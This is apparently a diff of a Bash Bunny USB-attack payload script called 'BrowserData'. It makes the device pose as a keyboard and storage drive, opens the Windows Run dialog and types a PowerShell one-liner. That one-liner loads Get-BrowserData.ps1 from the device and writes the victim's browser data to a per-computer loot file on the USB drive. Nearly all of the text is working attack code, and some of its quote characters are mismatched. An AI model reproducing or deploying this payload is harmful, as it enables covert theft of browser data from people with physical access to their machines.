@@ -1,4 +1,3 @@
-exit
 #!/bin/bash
 #
 # Title:         BrowserData
@@ -14,24 +13,27 @@ exit
 # Blue...............Running Script
 # Purple.............Finished
 
-# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
-source bunny_helpers.sh
+# Not sure if this is the right variable. Feel free to change it.
 
-LED R 200
+ATTACKMODE HID STORAGE
+
+GET SWITCH_POSITION
+
+LED R SLOW
 LOOTDIR=/root/udisk/loot/BrowserData
 mkdir -p $LOOTDIR
 
-ATTACKMODE HID STORAGE
-LED B 200
+
+LED B SLOW
 
 # wait 6 seconds for the storage to popup
 Q DELAY 6000
 Q GUI r
 Q DELAY 100
-RUN WIN powershell \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Get-BrowserData.ps1'); $bunny =(gwmi win32_volume -f ’label=‘’BashBunny’’' |  Select-Object -ExpandProperty DriveLetter); Get-BrowserInformation | Out-File -Append $bunny\loot\BrowserData\$env:computername.txt\"
+Q STRING  "powershell \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Get-BrowserData.ps1'); $bunny =(gwmi win32_volume -f ’label=‘’BashBunny’’' |  Select-Object -ExpandProperty DriveLetter); Get-BrowserInformation | Out-File -Append $bunny\loot\BrowserData\$env:computername.txt\""
 Q ENTER
 Q DELAY 2000
 Q STRING exit
 Q ENTER
 sync
-LED R B 200
+LED M SLOW
